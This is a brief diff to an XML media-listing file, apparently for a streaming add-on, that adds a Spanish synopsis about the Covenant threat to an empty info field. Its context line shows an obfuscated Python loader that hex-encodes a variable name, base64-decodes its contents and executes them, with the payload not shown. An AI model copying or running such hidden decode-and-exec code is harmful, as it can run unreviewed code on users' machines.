@@ -93,7 +93,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
-<info></info>
+<info>En el siglo 26, la humanidad tiene que lidiar con una amenaza alienígena conocida como the Covenant (El Pacto).</info>
 <thumbnail>https://www.themoviedb.org/t/p/original/oS3Fzf3eXSeK9L6DZYypLfa0fho.jpg</thumbnail>
 <fanart>https://www.themoviedb.org/t/p/original/ugZR4KzBlXb8FMLuZcJRCXuRL0e.jpg</fanart>
 </item>
